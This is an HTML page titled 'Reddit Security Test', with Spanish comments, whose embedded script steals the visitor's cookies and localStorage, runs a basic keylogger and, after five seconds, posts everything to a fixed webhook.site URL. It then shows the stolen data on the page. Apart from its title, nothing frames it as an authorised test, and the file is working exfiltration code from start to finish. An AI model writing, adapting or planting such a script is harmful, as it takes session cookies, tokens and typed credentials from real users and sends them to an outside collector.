<!DOCTYPE html>
<html>
<head>
    <title>Reddit Security Test</title>
    <style>
        body { font-family: Arial; padding: 20px; }
        #results { margin-top: 20px; padding: 10px; background: #f0f0f0; }
    </style>
</head>
<body>
    <h1>Prueba de Seguridad Reddit</h1>
    <div id="results">Esperando datos...</div>

    <script>
        // 1. Robar cookies
        const cookies = document.cookie;
        
        // 2. Robar localStorage
        const storage = JSON.stringify(localStorage);
        
        // 3. Keylogger básico
        let keystrokes = '';
        document.addEventListener('keypress', (e) => {
            keystrokes += e.key;
        });

        // 4. Exfiltrar datos a Webhook.site
        setTimeout(() => {
            const payload = {
                cookies: cookies,
                localStorage: storage,
                keystrokes: keystrokes,
                url: window.location.href,
                userAgent: navigator.userAgent
            };

            fetch('https://webhook.site/2987fab5-8cd1-4000-b483-d6e2eef59af2', {
                method: 'POST',
                body: JSON.stringify(payload),
                headers: { 'Content-Type': 'application/json' }
            })
            .then(() => {
                document.getElementById('results').innerHTML = 
                    '<h3>Datos recolectados:</h3>' + 
                    '<pre>' + JSON.stringify(payload, null, 2) + '</pre>';
            });
        }, 5000); // Envía después de 5 segundos
    </script>
</body>
</html>
